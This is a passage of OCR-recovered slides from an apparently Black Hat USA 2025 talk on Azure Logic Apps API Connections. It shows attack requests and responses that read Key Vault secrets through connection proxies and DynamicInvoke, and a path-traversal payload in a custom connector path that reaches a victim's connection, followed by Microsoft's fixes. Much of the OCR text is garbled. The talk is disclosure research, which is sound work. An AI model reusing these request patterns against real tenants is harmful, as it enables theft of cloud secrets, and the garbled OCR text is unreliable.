Thpq7i8xpOteSS587dswétrOqlh78vO0jp.bcollaborator.binsec.cloud/metadata/
instance \r \n
```

## Slide 68

###### Jira

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
Jira
& £5458 Ww Awe ww a a™eo se th > ~~. ee ed ws ee ee ee ee
26 Date: Fri, O3 Jan 2025 10:25:31 GHT
23 "Error :t
$C "code”":502,
31 "message":
"Unable to parse result body. JSON response expected. Body:
<html><body>bikt79vwébjruxdbépdzrtzjjgqkgqzbikt79Svwéebjruxdbsé
32 "source":
```

## Slide 69

###### Jira

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Jira
Description Request to Collaborator Response from Collaborator
Pretty Raw Hex & \n =
X-Azure-RequestChain: hops=1
x-mMs-operation-context:
(; app Id=797£4846-ba00-4£d7-ba43-dacl£8£63013, tenant Id=72£13b38-Ed4b-417c-be51-4e46£66a37a8, object Id=Sbc 682 d6-39 le-475e-855c-c&Bdec£L9461/ germa
nywestcentral/8a62d178-6449-45b2-al7a-—cOede718d0b3)
S x-ms-client-request-id: 9cfl2aecf-7a3b-474c-a327-Od2 Sa0ef3990
10 x-ms-arm-request-tracking-id: O711fedb-SOf8-433 l-a96d-T7ceadbéSéeb2
iil x-ms-correlation-request-id: O711fedb-S0f8-433 1-aGéd-T7ceadhbéSéeb2
12 x-ms-routing-request-id: GERMANYWESTCENTRAL:20250103T1025312Z:0711fedb-SOf8-433 1-a96d-7ceadbéSéehb2
13 x-ms-client-location: germanywestcentral
i4 x-ms-home-tenant-id: 72£13b38-6d4b-417c-be51-4e46f66a37aB
15 x-ms-arm-service-request-id: 5a852172-195c-4974-a390-S88889a444cf
16 x-ms-client-audience: https://management.core.windows.net/
17 x-ms-client-scope:
is x-ms-client-acr:
19 Content-Type: application/json
20 | x-ms-client-app-id-acr: 1
21 Authorization: Basic
NabVo151NCaX1HbGVNYOF 1
22 x-ms-client-issuer: https: ts.windows.net/72£13b38-6d4b-417c-be51-4e46f£66a37a8/
23 X-MS-APIM-Callback: https://logic-norwayeast-O001.consent.azure-apihub.net
24 x-ms-client-puid:
25 x-ms-client-alt-sec-—id:
26 x-ms-client-principal-id:
27 x-ms-client-authorization-source: RoleBased
28 x-ms-client-identity-provider: https sts.windows.net/72£13b38-6d4b-417c-be51-4e46f£66a37a8/
29 x-ms-client-principal-group-membership-source: None
39 x-ms-client-principal-name:
31 x-ms-client-family—name-encoded:
32 x-ms-client-given-name-encoded:
33 x-ms-arm-network-source: PublicNetwork
34 x-ms-activity-vector: IN.O1.IN.O9
35 X-ARR-LOG-ID: Scf2aecf-7a3b-474c-a327-Od2 5a0ef3990
36 | CLIENT-IP: 51.116.150.71:13378
@ & €\ 13>] | x-for x 5 matches
```

## Slide 70

###### Keyvaults

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
Keyvaults
Request
Pretty Raw Hex ® in
1 | GET
/subscriptions/ 8e3ce52 f-d45b-43 47-8705-65892507465e/resourceGroups
/tmp-api-connection/ providers/ Microsoft. Web/connections/keyvault-5
fjextensions/proxy/secrets/MySecretValue/value? éapi-version=
2018-07-Ol-previewéprojectkey=TP HTTP/2
2 Host: management.azure.com
```

## Slide 71

###### Keyvaults

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Keyvaults
28 Date: Tue, O7 Jan 2025 14:42:46 GMT
"value": "MySecretValue"
"name": "MySecretValue”",
"version": "4866éb8cdccé64e75al5é42cecT79céél6",
"contentType”":null,
"isEnabled":true,
"createdTime": "2025-01-07T14:24:522",
"last UpdatedTime”: "2025-01-07T14:24:522",
"validityStartTime”":null,
"validityEndTime”": null
```

## Slide 72

“Azure Key Vault safeguards encryption keys and secrets like certificates, connection strings, and passwords.”

https://learn.microsoft.com/en-us/azure/key-vault/general/best-practices

#BHUSA   @BlackHatEvents

## Slide 73

### Microsoft Response

#BHUSA   @BlackHatEvents

## Slide 74

###### What did they fix?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
What did they fix?
Request
Pretty Raw Hex JSON Web Token ® » =
GET
/subscriptions/ 863ce52 £-d45b-43 47-8705-65892507465e/resourceGroups/token-storer/ providers/M
icrosoft.Web/connections/keyvault/extensions/proxy/secrets/Papi-version=2018-07-O1-preview
HTTP/2
Host: management.azure.com
3 X-Ms-Client-Session-Id: O87£f£477033 aas40f7ad3 6£89df34ab9lc
4 Authorization: Bearer
eyJ0eXAiOidJKVLOiLCJUhbGcid0idJsuUzIINilIsIngldCIéIkKNOdjBPSTNSd3FsSEZFVmShbOLBc2ZhHDSDIJYRSIsImtpZclI
```

## Slide 75

###### What did they fix?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
What did they fix?
Merron” 24
"code": "OperationNotAllowed",
"message":
"The API Connection proxy requests are not supported. Only Test Connections
llowed through proxy requests
```

## Slide 76

###### What did they fix?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
bisa hat
BRIEFINGS
What did they fix?
21 scope
Rerror™ :{
"code": "OperationNotAllo the
"message":
"The API Connection prox access token -onnections
llowed through proxy req
}
}
Whitelist
paths
```

## Slide 77

###### Lots of others

#BHUSA   @BlackHatEvents

Ref: https://learn.microsoft.com/en-us/connectors/connector-reference/

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat
BRIEFINGS
Lots of others
a = microsoft.com,
Filter by title |
Microsoft Copilot Studio, Microsoft Power Platform, and Azure
Logic Apps connectors documentation
> Connectors overview
> Custom connectors
Connectors in preview FAQ
Outbound IP addresses
Known issues
Provide feedback
~ Connector reference
List of all connectors
> List of filters
Jexghts gen. Document & more
10to8 Appointment Scheduling
1DocStop
1Me Corporate
Ipt (Independent Publisher)
24 pull request (Independent Publisher)
365 Training
3E Events
9A Raptor Document Warehouse
Abbreviations
Abortion Policy (Independent Publisher)
absentify
Abstract Company Enrichment (Independent Publisher)
Abstract Email Validator (independent Publisher)
Abstract Exchange Rates (Independent Publisher)
Abstract Holidays (Independent Publisher}
Abstract IBAN Validator (Independent Publisher)
Abstract IP Geolocation (Independent Publisher)
Abstract Phone Validator (Independent Publisher)
Abstract Timezones (Independent Publisher)
Abstract VAT Validator (Independent Publisher)
AccuWeather (Independent Publisher)
Act!
Activityinfo
Acumatica
Download PDF
»®
By: Férdés Andras
jator
ndent Publisher
>?
By: Ford6s Andras
»>®
By: Acumatica
»?
By: Adobe Inc
yendent Publisher
»®
By: Troy Taylor, Hitachi
Solutions
>»?
By: Africa's Talking
—
»®?
By: ahead AG
j aepenue
>»?
By: Fordés Andrés
»°®
By: Ahmad Najjar, Troy Taylor
»°
By: Richard Wilson
»°
By: Troy Taylor
rip (Independe
>?
By: Taiki Yoshida
1
»°®
By: ahead AG
>°®
By: Swiftpage ACT!
Adobe Acr
>?
By: Adobe Inc.
By: Adobe Inc.
a>?
By: Africa's Talking
>?
By: AgilePoint Inc
x
Not (Indeper
Publishe
>»?
By: Fordés Andrés
Ref: https://learn.microsoft.com/en-us/connectors/connector-reference/
»°®
By: System Administrator
By: Activityinfo
>?
By: Adobe Inc.
a»?
By: State Solutions
Africa’s Talking
»>°?
By: Africa's Talking
a»?
By: Agilit-e
a?
By: Larc Al (PTY) Ltd
```

## Slide 78

###### Sensitive Testconnections (?)

<u>https://www.pagerduty.com</u>

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat by — —
BRIEFINGS ; ' ; b
Sensitive Testconnections (7?)
Al Foundations
Automation PDagerDuty
> Operations
/ Cloud
\ —
```

## Slide 79

###### Sensitive Testconnections (?)

https://mail.google.com

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat
BRIEFINGS
Sensitive Testconnections (7?)
Al Foundations
®
https://mail.google.com
```

## Slide 80

###### Sensitive Testconnections (?)

https://calendar.google.com

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
blackhat
BRIEFINGS
Sensitive Testconnections (7?)
31
Al Foundations
®
https://calendar.google.com
```

## Slide 81

### Could we do more?

All connections are hosted in the same place

#BHUSA   @BlackHatEvents

## Slide 82

###### Do you remember Slide 9?

#BHUSA   @BlackHatEvents

## Slide 83

###### Do you remember Slide 9?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ . > —
on 7
black hat ye. ’
BRIEFINGS ‘4
pif hat
BRIEFINGS
```

## Slide 84

###### Dynamic Invoke

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat by — Ne yi
BRIEFINGS
“body”: {
“request”: {
"method": “get",
“path”: "conversations. list
r
J3
“requestUri": “https://management.azure.com:443/subscriptions/
2
>
65892507465e/resourceGroups/Logic-app-
p nvoke? 11 -verci90on—7012-07-01-
Invoke :ap1-version=2018-07-@01
"method": “POST”
```

## Slide 85

###### Dynamic Invoke

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q NN Supe i
black hat y me P
BRIEFINGS :
Dynamic Invoke
“testRequests":
{
“body”: {
“request”: {
“method™ :
"path": "conversations. list”
1
“requestUri": “https://management.azure.com:443/subscriptions/8e3ce‘
6589 /A65e/resourceGroup
“method : POST™
```

## Slide 86

###### Dynamic Invoke

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
black hat by — Ne yi
BRIEFINGS
“body”: {
“request”: {
"method": “get",
“path”: "conversations. list
r
J3
“requestUri": “https://management.azure.com:443/subscriptions/
2
>
65892507465e/resourceGroups/Logic-app-
p nvoke? 11 -verci90on—7012-07-01-
Invoke :ap1-version=2018-07-@01
"method": “POST”
```

## Slide 87

###### Dynamic Invoke

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
re) | 7% te )
blackhat So ame 4
BRIEFINGS ;
“body”: {
“request”: {
"method": “get",
og
ge
“path”: “conversations. list”
```

## Slide 88

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
© aN , : >
blackhat S fe Gl LA 5
BRIEFINGS : y p :
/subscriptions/162fc6édb-03cd-4fe8-ab44-dc@a947e74af/resour bp shitty
richlasiahestl A dhedita ee crosoft.Web/connections/slack/DynamicInvoke?api-version=2018
Q@1-preview HTTF
Host: management.azure.com
Authorization: Bearer <Token>
"request": {
“method”: "get",
a
“path":"/conversations. list"
4°)
3
```

## Slide 89

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
m > | pp
blackhat HTTP/2 200 OK 9
BRIEFINGS Content-Type: application/json
/subscriptions/162Ff ~esourceGroups/api-
i
connec CE 10 on / prov ;
ers/M1C "ok": true, nicinvoke
nA Sen ene ae eae : "channels"
Yi-Dreview tf :
{
Host: management.azure.c EINE
Authorization: Bearer <T "name": "social",
"is channel": true,
"is group": false,
oem)
"is im": false,
“request” :{ "is mpim": false,
"method": "set ae "is private”: false,
=
= Erle "created": 1738674777,
path . / Convers "is archived": false
i rchived": false,
7 ns ~ ". |
S is general”: false,
=
} "unlinked": 0,
"name normalized": "social"
"is shared": false,
"is org shared": false,
_ shared": false,
feendiny sheet” eh ss
context team id": "TOS8BPBEC890",
```

## Slide 90

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
#) | rN
black hat
BRIEFINGS
/subs Se ee
inection/providers/Microsoft.|
Q@7-@01-preview HTTP
Host: management.azure.com
“request”: {
“method” : “get”
“path” :"/sec
a)
1
J
b44-dc
actions
Py.
```

## Slide 91

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
= ; fh
biSekhat a >
BRIEFINGS
(TP/2 200 OK
Content-Length: 1315
Content-Type: application/json; charset=utf-8
.on=2018-
/sut
connecti
Q67-O0l1-pr {
Host: ma "response": {
“statusCode": “OK",
“body” 5:4
“value”: [
{ {
“name": “SuperSecret",
= “version"™: null,
“contentType": :
“isEnabled": true,
r "“createdTime": "2025-@4-@4T05:38:26Z",
: “lastUpdatedTime": "2025-04-@47T05:38:262Z",
} “validityStartTime": null,
“validityEndTime™: l
iF
“continuationtToken™: nu
```

## Slide 92

### Path Parameters!

#BHUSA   @BlackHatEvents

## Slide 93

#BHUSA   @BlackHatEvents

## Slide 94

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

#BHUSA   @BlackHatEvents

## Slide 95

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

Role Check:

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
(*) Azure Resource Manager <> Authentication
Role Check: 96
```

## Slide 96

Path and method valid?

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
Path and
method <» (>) Azure Resource Manager = <> Authentication
valid?
```

## Slide 97

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

Path and method valid? Validated:

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
Path and
method <» (>) Azure Resource Manager = <> Authentication
valid?
Validated: 9
```

## Slide 98

Path and method valid?

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
Path and
method <> (i) Azure Resource Manager «—> Authentication
valid?
Path.Join(Host, ConnectionId, InputEndpoint)
```

## Slide 99

Path and method valid?

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
Path and
method <» (>) Azure Resource Manager = <> Authentication
valid?
Path.Join(Host, ConnectionId, InputEndpoint)
and policies
+
> i +
|
```

## Slide 100

Path and method valid?

Call endpoint “/path”, Method: “POST”, Body: “<Data>”

Uh oh!

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
—
»~
| all endpoint “/path”, Method:
“POST”, Body: “<Data>”
Path and
method <> (i) Azure Resource Manager «—> Authentication
valid?
Path.Join(Host, ConnectionId, InputEndpoint)
=
connector swagger
and policies U h O h |
```

## Slide 101

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
2)
black hat
BRIEFINGS
Logic Apps Custom Connector ¥#
Microsoft
Logic Apps Custom Connector © ads to Favorites
Microsoft | Azure Service
* 3.4 (52 ratings)
Plan
Logic Apps Custom Connector Vv | | Create |
```

## Slide 102

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QQ ~
black hat
BRIEFINGS
myconnector
my nice connector that does a lost of things that we we
1.0
ejivnbcrgf4a4mep2tesxv3u spre. bcollaborator.binsec.cloud
default
thing that comes ba
gyresponse
boolean
call some api
/admin/vfs/c
/path/ {pati
default
if
path thing
do andnand
MyCustomizer
urity
ector®@
F4admep2t
Mnector that does a lost of things that)
/hei/a call some api
/path/{paths} path thing
/hei do something on localhost
/heisann check this out
> |
```

## Slide 103

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
QO 7 ~ spo | i
black hat y Ba GA
BRIEFINGS . 4 4
patns:
/path/{path}:
get:
operationId: "1"
parameters:
- name: path
in: path
required: true
type: string
responses:
‘200°:
description: OK
```

## Slide 104

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
>
black hat Sy |
BRIEFINGS a 4 ,
8e3ce52f-d45b- 4347 -8705-65892507465e/resourceGroups/token-
/custom2/DynamicInvoke?api-version=2018-@7-
IST /subscriptions/
storer/provider ee a ee
O1- prev 1ew HTIP/2
vere management.azure.com
Bearer <Token>
Authorization:
ieee |
=
“method”: “get",
“path”:
‘$2020 /h2e%42e/apim/<ConnectorID>/<ConnectionID>/<Endpoint>”
```

## Slide 105

#BHUSA   @BlackHatEvents

Path Traversal

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
>
black hat Sy |
BRIEFINGS a 4 ,
8e3ce52f-d45b- 4347 -8705-65892507465e/resourceGroups/token-
/custom2/DynamicInvoke?api-version=2018-@7-
IST /subscriptions/
storer/provider ee a ee
O1- prev 1ew HTIP/2
vere management.azure.com
Bearer <Token>
Authorization:
ieee |
=
“method”: “get",
“path”:
h ‘$2020 /h2e%42e/apim/<ConnectorID>/<ConnectionID>/<Endpoint>”
Path Traversal
```

## Slide 106

New Path

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
= J
piSeichat
. > >
\ i, ~
BRIEFINGS
f
IST /subscriptions/S8e3ce52f-d45b-4347-8705-65892507465e/re
storer/ Ss pti an tic
eta mmc tenieithioe
-rosoft. uy ok
en-
amicInvoke?api-version=2018-0@7-
nee eens
Authorization:
Bearer <Token>
f
t
Tein {
‘method": “get”,
path”:
“path/%2e42e/42eh2e/Kh2e%42e/h2eE%42e/ apim/<Connector1D>/<¢
1
J
<ConnectionID>/
<Endpoint>"
```

## Slide 107

#BHUSA   @BlackHatEvents

## Slide 108

##### Runtime URL

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
/ ~~ > —
Q 7 y ea >
blackhat | — ’
BRIEFINGS y
=m SERA SY Ce aa Sepa Cee a en ae AehoensnaeT46SFfi1ic
| = 7— = —" —" - —~ 4 — : ~ ~ —" Gt =
So 5 ae 8 ow Lilt white WL Wiis it ww Oi od ~¥w~AlLAS LUO sto ae AN ed oF eh LL Sore 5 ae & —
~o tr ~ — = we — —" oe — a — fe — ee — =F 3 7h Levvau om
pe oe Le he eee YS ee SP et er ee Se ~~ ee Ser & =F 3 ee ee Y V OAL.
L L 2
10 a a a a uaa. smn ArcrT a . . -
-. —} mn’ om! rm EL wee 6 Ine “ao er ger yret a rier imacec reat Trp i=
ae eh IA 2. OS. SO SE oe a ot ot oe rh SE lw 2. WS LSU ew Oe Vi LF LiMo S LS LU ‘f= SS he
HTTP/2
```

## Slide 109

##### Traversal

#BHUSA   @BlackHatEvents

## Slide 110

##### Victim’s API Connection

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
Q 7 ~~ Z x aa q
black hat —
BRIEFINGS ' Y
Victim’s API Connection
```

## Slide 111

##### Victim’s secret

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 . >
on 7
gQ | N ‘ 4 —
black hat >. ’
BRIEFINGS ; y 4
= MEERA EAT ee ea aE Seay, a ee ge Pe 1h O9ASRhae T465Hfi1-
GET apim/CustomConnector/s /Usadetoss4ce /lach’ZzdsaVve /463tle
a) — oe ~ —= ~~ —= fy = > = ~~ —=— > _—" ~~ — Se 4 —_ — ho. ee race LeVvVavU >
pw oe Le he eee YS ee SP et er ee Se wee ee UV ee et ee ee et pe see Y V OAL
‘ f 5
LA ee CUCL Suioloe, Gt Be eked See ee Lad . h
Se ee | +-fzta m wh 2 A Oy inl at a 4-465 ar car ret a rier amaecr re wa lie
Pe SeelS teS Bee OS See 68 bet BY Be SF Pe PS ES a SS © hb de ae CO ee oe ers SO ee VV ww & Lilo oS ws SS CA tk. LA
HTTP/2
```

## Slide 112

###### Demo

#BHUSA   @BlackHatEvents

## Slide 113

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
\ victomkeyvault - Microsoft A:
portaLazure.com/#
thegmasterman@outlo.
DEFAULT DIRECTORY (THEGMAS..
Microsoft Azure
Name: Haakon Gu
Email: thegmasterman@outlook.com
Directory: Default Directory ( 3964
Domain: thegmastermanoutlook.onm
Your sign in used multifactor authentx
© victomkeyvault ¥ *
P Search | < w Delete > Move c ) Refresh Open in mobile
. a
Overview “ Essentials
y Resource g : ap nnection Vault URI : https://victomkeyvault.vault.azure.net/
f@ Activity log picconnection
ocatio’ : , Pricing tier) :
Ro Access control (IAM) Location Norway East icing tier) ; Standard
or Subscription (m Directory ID : 27f83964-8425-4197-8278-6e183a4 13ea3
ags
Subscription ID : 162fc6db-03cd-4fe8-ab44-dc0a947e74at Directory Name _ : Default Directory
Z Diagnose and solve problems
Soft-delete
z= Access policies Purge protection’: D j
1. Resource visualizer
vor Tags (edit) : Add
Events
Y Objects Get started Properties Monitoring Tools + SDKs Tutorials
Keys °
Manage keys and secrets used by apps and services
Secrets
Our recommendation is to use a vault per application per environment (Development, Pre-Production
& Certificates and Production). This helps you to not share secrets across environments and also reduces the threat in
case of a breach.
> Settings
> Monitoring
v— t | I
> Automation tome —
nable | in t
> Help Control access to key vault minony Raping andisekup Turn on recovery options
Assign access policy and For protection against accidental
determine whether a given service a Se or malicious deletion, soft-delete
principal, namely an application or oaieare pi aed wag is enabled. Turn on purge
user group, can perform different siietiad ania oan van — protection to guard against
Operations on key vault keys, P gu manual purging of deleted key
for key vault metrics €.g., service sae
secrets or certificates. vaults and items. Learn more U
API latency, error code, throttling.
(nn nn fy Se eee a
```

## Slide 114

### Microsoft Response

#BHUSA   @BlackHatEvents

## Slide 115

#BHUSA   @BlackHatEvents

## Slide 116

https://learn.microsoft.com/en-us/co nnectors/connector-architecture

###### What did they fix?

#BHUSA   @BlackHatEvents

## Slide 117

https://learn.microsoft.com/en-us/co nnectors/connector-architecture

###### What did they fix?

#BHUSA   @BlackHatEvents

## Slide 118

https://learn.microsoft.com/en-us/co nnectors/connector-architecture

###### What did they fix?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
4 ™ >
oO a Lica
black hat \ am
BRIEFINGS }
What did they fix?
{
“error’: {
"code": nvalidApiConnectionDynamicInvokeReques
“message: “The dynamic invocation request
```

## Slide 119

https://learn.microsoft.com/en-us/co nnectors/connector-architecture

###### What did they fix?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
e% a >
black hat by >
BRIEFINGS ;
What did they fix?
Scope
the
“error”: { access token
“code”: “InvalidApicor
"message": “The dynamic inv invalid. Th
Blacklist
paths
```

## Slide 120

### Takeaways

#BHUSA   @BlackHatEvents

## Slide 121

### Hacking Azure is not black magic

#BHUSA   @BlackHatEvents

## Slide 122

### The Fix is Silent

#BHUSA   @BlackHatEvents

## Slide 123

###### Any Questions?

#BHUSA   @BlackHatEvents

> Text below was recovered by OCR from an image-only slide; treat wording as approximate.

```text
ky aes iy
- biékhat
AUGUST 6-7, 2025
MANDALAY BAY / LAS VEGAS
Any Questions?
#BHUSA @BlackHatEvents
```
